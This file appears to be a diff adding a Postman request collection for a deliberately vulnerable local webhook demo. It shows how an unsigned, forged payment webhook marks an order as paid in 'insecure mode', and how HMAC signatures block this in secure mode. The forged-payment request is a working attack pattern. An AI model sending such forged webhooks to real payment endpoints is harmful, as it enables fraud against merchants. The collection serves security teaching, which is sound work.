@@ -1,0 +1,164 @@
+{
+  "info": {
+    "name": "Vulnerable Webhook Demo - Attack Collection",
+    "description": "Collection of requests to demonstrate webhook vulnerabilities",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "1. Create Order",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{}"
+        },
+        "url": {
+          "raw": "http://localhost:3000/api/create-order",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["api", "create-order"]
+        },
+        "description": "Creates a new order and returns an order ID. Copy the order_id from the response to use in the attack."
+      },
+      "response": []
+    },
+    {
+      "name": "2. Check Order Status",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "http://localhost:3000/api/order/ORD_XXXXXXXXX",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["api", "order", "ORD_XXXXXXXXX"]
+        },
+        "description": "Replace ORD_XXXXXXXXX with your actual order ID. Shows current order status (PENDING or PAID)."
+      },
+      "response": []
+    },
+    {
+      "name": "3. 🔴 EXPLOIT - Fake Payment Webhook (Insecure Mode)",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"order_id\": \"ORD_XXXXXXXXX\",\n  \"payment_success\": true\n}"
+        },
+        "url": {
+          "raw": "http://localhost:3000/webhook/payment",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["webhook", "payment"]
+        },
+        "description": "⚠️ THE ATTACK: Replace ORD_XXXXXXXXX with your order ID. This will mark the order as PAID without any actual payment in insecure mode!"
+      },
+      "response": []
+    },
+    {
+      "name": "4. Toggle Security Mode",
+      "request": {
+        "method": "POST",
+        "header": [],
+        "url": {
+          "raw": "http://localhost:3000/api/toggle-security",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["api", "toggle-security"]
+        },
+        "description": "Switches between secure and insecure mode. Use this to compare behaviors."
+      },
+      "response": []
+    },
+    {
+      "name": "5. Check Security Status",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "http://localhost:3000/api/security-status",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["api", "security-status"]
+        },
+        "description": "Shows whether secure mode is ON or OFF, and displays the webhook secret if secure mode is enabled."
+      },
+      "response": []
+    },
+    {
+      "name": "6. 🔒 Valid Webhook (Secure Mode) - Will Fail Without Signature",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"order_id\": \"ORD_XXXXXXXXX\",\n  \"payment_success\": true,\n  \"signature\": \"GENERATE_VALID_HMAC_SIGNATURE_HERE\"\n}"
+        },
+        "url": {
+          "raw": "http://localhost:3000/webhook/payment",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["webhook", "payment"]
+        },
+        "description": "In secure mode, this request will be REJECTED unless you provide a valid HMAC signature. Use the Node.js script to generate the signature."
+      },
+      "response": []
+    },
+    {
+      "name": "7. View All Orders (Admin)",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "http://localhost:3000/api/all-orders",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["api", "all-orders"]
+        },
+        "description": "Lists all orders in the system with their current status."
+      },
+      "response": []
+    },
+    {
+      "name": "8. View Webhook Logs",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "http://localhost:3000/api/webhook-logs",
+          "protocol": "http",
+          "host": ["localhost"],
+          "port": "3000",
+          "path": ["api", "webhook-logs"]
+        },
+        "description": "Shows the last 10 webhook requests received, useful for monitoring attacks."
+      },
+      "response": []
+    }
+  ]
+}
